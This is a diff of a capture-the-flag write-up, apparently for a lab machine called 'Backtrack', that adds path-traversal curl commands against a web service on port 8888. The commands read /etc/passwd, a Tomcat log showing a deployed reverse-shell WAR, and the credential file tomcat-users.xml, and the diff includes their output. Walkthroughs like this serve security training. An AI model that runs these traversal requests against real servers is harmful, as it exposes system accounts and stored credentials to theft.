@@ -237,27 +237,28 @@ Progress: 4614 / 4615 (99.98%)
 
 <br>
 <br>
-<h2>Web port 8888  .  /etc/passwd</h2>
+<h2>Web port 8888  .  /etc/passwd  .  catalina.out  .  tomcat-users.xml</h2>
 
 ```bash
-curl --path-as-is http://10.201.93.190:8888/../../../../../../../../../../etc/passwd
+:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../etc/passwd | grep '/bin/bash'
+...
+root:x:0:0:root:/root:/bin/bash
+orville:x:1003:1003::/home/orville:/bin/bash
+wilbur:x:1004:1004::/home/wilbur:/bin/bash
 ```
 
-<img width="1237" height="658" alt="image" src="https://github.com/user-attachments/assets/a964d269-50d4-4cf8-b5c2-ecba4d3b9f16" />
-
-
-<br>
-<br>
-<h2>:8888/flags</h2>
-<p>
-
-- Error: ENOENT: no such file or directory, open '/opt/aria2/docs/flags//index.html'</p>
-
-
-<h2>Web port 8888  .  /opt/tomcat/conf/tomcat-users.xml</h2>
 
 ```bash
-~/Backtrack# curl --path-as-is http://10.201.93.190:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml
+:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../opt/tomcat/logs/catalina.out
+...
+09-Mar-2024 11:57:18.198 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/webapps/ROOT]
+...
+09-Mar-2024 12:13:36.144 INFO [http-nio-8080-exec-2] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/opt/tomcat/webapps/reverse_shell.war]
+09-Mar-2024 12:13:36.624 INFO [http-nio-8080-exec-2] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/opt/tomcat/webapps/reverse_shell.war] has finished in [479] ms
+```
+
+```bash
+:~/Backtrack# curl --path-as-is http://10.201.46.180:8888/../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
 <?xml version="1.0" encoding="UTF-8"?>
 <tomcat-users xmlns="http://tomcat.apache.org/xml"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -269,6 +270,7 @@ curl --path-as-is http://10.201.93.190:8888/../../../../../../../../../../etc/pa
 
 </tomcat-users>
 ```
+
 
 <h2>:8080/manager</h2>
 
